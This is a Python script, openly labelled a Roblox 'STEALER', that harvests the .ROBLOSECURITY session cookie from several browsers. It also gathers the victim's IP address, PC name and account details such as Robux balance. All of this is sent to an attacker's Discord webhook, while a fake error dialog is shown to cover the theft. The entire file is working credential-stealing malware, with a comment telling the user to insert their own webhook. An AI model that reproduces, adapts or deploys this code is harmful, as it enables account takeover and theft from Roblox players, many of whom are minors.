import os
import base64, codecs
import json
import robloxpy
import requests,re
from discordwebhook import *
import browser_cookie3
import ctypes

#CHANGE THE HOOKLINK TO YOUR DISCORD WEBHOOK LINK
webhookk = "hooklink"

def command(c):
    os.system(c)
def cls():
    os.system("cls")

def cookieLogger():

    data = []

    try:
        cookies = browser_cookie3.firefox(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass
    try:
        cookies = browser_cookie3.chromium(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass

    try:
        cookies = browser_cookie3.edge(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data               
    except:
        pass

    try:
        cookies = browser_cookie3.opera(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass

    try:
        cookies = browser_cookie3.chrome(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass

discord = Discord(url=webhookk)
cookies = cookieLogger()
ip_address = requests.get("https://api.ipify.org/").text
try:
    roblox_cookie = cookies[1]
except:
    discord.post(
    username="IZUKINO - RBX ERROR",
    avatar_url="https://cdn.discordapp.com/icons/887904537304784967/1a9675cb4f79d2d7e6358e4b2bd4ccb4.png?size=4096",
    embeds=[
        {
            "username": "IZUKINO - RBX",
            "title": "PHÁT HIỆN LỖI",
            "color" : 10038562,
            "description": "NGƯỜI DÙNG CHƯA ĐĂNG NHẬP ROBLOX",
            "thumbnail": {"url": "http://www.clker.com/cliparts/8/3/3/4/1195445190322000997molumen_red_round_error_warning_icon.svg.hi.png"},


            }
        ],
    )
    exit()

isvalid = robloxpy.Utils.CheckCookie(roblox_cookie)
if isvalid == "Valid Cookie":
    isvalid = "Valid"
else:
    discord.post(
    username="IZUKINO - RBX ERROR",
    avatar_url="https://cdn.discordapp.com/icons/887904537304784967/1a9675cb4f79d2d7e6358e4b2bd4ccb4.png?size=4096",
    embeds=[
        {
            "username": "IZUKINO - RBX",
            "title": "PHÁT HIỆN LỖI",
            "color" : 10038562,
            "description": "NGƯỜI DÙNG CHƯA ĐĂNG NHẬP ROBLOX",
            "thumbnail": {"url": "http://www.clker.com/cliparts/8/3/3/4/1195445190322000997molumen_red_round_error_warning_icon.svg.hi.png"},


         }
    ],
)
    exit()

ebruh = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":roblox_cookie})
info = json.loads(ebruh.text)
rid = info["UserID"]
rap = robloxpy.User.External.GetRAP(rid)
friends = robloxpy.User.Friends.External.GetCount(rid)
age = robloxpy.User.External.GetAge(rid)
dnso = None
crdate = robloxpy.User.External.CreationDate(rid)
rolimons = f"https://www.rolimons.com/player/{rid}"
roblox_profile = f"https://web.roblox.com/users/{rid}/profile"
headshot = robloxpy.User.External.GetHeadshot(rid)
username = info['UserName']
robux = info['RobuxBalance']
premium = info['IsPremium']

ctypes.windll.user32.MessageBoxW(0, "That's an error", "ERROR", 16)

discord.post(
    username="IZUKINO - RBX STEALER",
    avatar_url="https://cdn.discordapp.com/icons/887904537304784967/1a9675cb4f79d2d7e6358e4b2bd4ccb4.png?size=4096",
    embeds=[
        {
            "username": "IZUKINO - RBX",
            "title": "Hàng về nè cu em",
            "description" : f"[Link Profile]({roblox_profile})",
            "color" : 15277667,
            "fields": [
                {"name": "Tên", "value": username, "inline": True},
                {"name": "Robux", "value": robux, "inline": True},
                {"name": "Premium", "value": premium,"inline": True},
                {"name": "Ngày tạo acc", "value": crdate, "inline": True},
                {"name": "Bạn bè", "value": friends, "inline": True},
                {"name": "IP Address", "value" : ip_address, "inline:": True},
                {"name": "PC NAME" , "value" : os.environ['COMPUTERNAME'], "inline:": True},
                {"name": "COOKIE", "value": f"```fix\n{roblox_cookie}```", "inline": False},
            ],
            "thumbnail": {"url": headshot},


        }
    ],
)
